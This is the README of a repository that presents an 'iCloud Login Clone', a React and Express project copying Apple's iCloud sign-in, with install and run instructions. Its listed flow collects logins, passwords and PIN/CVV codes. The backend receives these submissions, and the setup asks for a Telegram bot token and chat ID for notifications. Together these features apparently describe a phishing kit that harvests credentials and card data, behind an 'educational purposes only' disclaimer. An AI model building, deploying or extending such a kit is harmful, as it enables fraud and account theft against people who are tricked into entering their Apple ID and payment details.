# iCloud Login Clone

A full-stack iCloud login clone built with React (Frontend) and Node.js/Express (Backend). This project demonstrates a modern UI/UX design inspired by Apple's iCloud login interface.

## 🚀 Features

- **Responsive Design**: Mobile-first, sleek UI.
- **Multi-step Flow**: Includes Login, Password, and PIN/CVV verification pages.
- **Backend Integration**: Express server to handle data submissions.
- **Modern Tech Stack**: React, Vite, and CSS for the frontend; Node.js for the backend.

## 🛠️ Tech Stack

- **Frontend**: React, Vite, CSS (Vanilla)
- **Backend**: Node.js, Express, Axios, CORS, Dotenv
- **Tooling**: Nodemon (for development)

## 📁 Project Structure

```text
icloud-login/
├── icloud-login/      # React Frontend
│   ├── src/           # Application Source
│   └── vite.config.js # Vite Configuration
├── server/            # Node.js Backend
│   └── server.js      # Main Server File
└── package.json       # Root scripts to run both
```

## ⚙️ Installation & Setup

### 1. Clone the repository
```bash
git clone https://github.com/israinsols/icloud-login.git
cd icloud-login
```

### 2. Install Dependencies

Install root, frontend, and backend dependencies:
```bash
npm install
cd icloud-login && npm install
cd ../server && npm install
```

### 3. Environment Variables

Create a `.env` file in the `server/` directory and add your configurations (e.g., BOT_TOKEN, CHAT_ID for Telegram notifications if applicable).

### 4. Run the Application

From the root directory, you can run both the frontend and backend simultaneously:
```bash
npm run dev
```

- **Frontend**: Runs on [http://localhost:5173](http://localhost:5173)
- **Backend**: Runs on [http://localhost:5000](http://localhost:5000)

## 📄 License

This project is for educational purposes only.
